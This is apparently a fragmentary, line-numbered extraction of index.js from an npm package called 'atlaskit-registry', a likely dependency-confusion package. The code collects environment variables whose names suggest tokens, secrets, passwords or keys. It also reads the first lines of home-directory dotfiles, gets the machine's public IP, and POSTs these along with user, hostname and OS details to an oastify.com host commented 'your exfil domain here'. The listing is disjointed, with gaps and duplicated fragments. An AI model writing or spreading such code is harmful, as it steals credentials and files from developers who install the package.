// File: tmp/tmphrdwzvh6/atlaskit-registry/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 5: _tmp_1 = require('crypto')
Line 13: key.toLowerCase().includes('token')
Line 14: key.toLowerCase().includes('secret')
Line 15: key.toLowerCase().includes('password')
Line 16: key.toLowerCase().includes('key')
Line 21: _tmp_7.push(".bash_profile")
Line 25: path.join(home, file)
Line 27: {
      const content = fs.readFileSync(fullPath, 'utf-8');
      readFiles[file] = content.split('\n').slice(0, 30).join('\n');
    }
Line 28: const content = fs.readFileSync(fullPath, 'utf-8')
Line 29: readFiles[file] = content.split('\n').slice(0, 30).join('\n')
Line 31: catch (e) {
    readFiles[file] = 'error';
  }
Line 32: readFiles[file] = 'error'
Line 37: {
  const req = https.request({
    hostname: 'api.ipify.org',
    path: '/?format=json',
    method: 'GET'
  }, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        callback(JSON.parse(data).ip);
      } catch {
        callback('unknown');
      }
    });
  });
  req.on('error', () => callback('unknown'));
  req.end();
}
Line 38: const req = https.request({
    hostname: 'api.ipify.org',
    path: '/?format=json',
    method: 'GET'
  }, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        callback(JSON.parse(data).ip);
      } catch {
        callback('unknown');
      }
    });
  })
Line 47: callback(JSON.parse(data).ip)
Line 49: callback('unknown')
Line 53: callback('unknown')
Line 54: req.end()
Line 57: {
  const payload = JSON.stringify({
    id,
    ip,
    time: new Date().toISOString(),
    cwd: process.cwd(),
    entry: require.main?.filename || 'unknown',
    os: {
      user: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      release: os.release()
    },
    env: safeEnv,
    dotfiles: readFiles
  });

  const req = https.request({
    hostname: 'pune53efpxwuxxugbnfi0repcgi763us.oastify.com', // ← your exfil domain here
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, res => { /* ignore response */ });

  req.on('error', () => { /* ignore error */ });
  req.write(payload);
  req.end();
}
Line 58: const payload = JSON.stringify({
    id,
    ip,
    time: new Date().toISOString(),
    cwd: process.cwd(),
    entry: require.main?.filename || 'unknown',
    os: {
      user: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      release: os.release()
    },
    env: safeEnv,
    dotfiles: readFiles
  })
Line 63: _tmp_11.entry = require.main?.filename || 'unknown'
Line 65: os.userInfo()
Line 66: os.hostname()
Line 67: os.platform()
Line 68: os.arch()
Line 75: const req = https.request({
    hostname: 'pune53efpxwuxxugbnfi0repcgi763us.oastify.com', // ← your exfil domain here
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, res => { /* ignore response */ })
Line 87: req.write(payload)
Line 88: req.end()
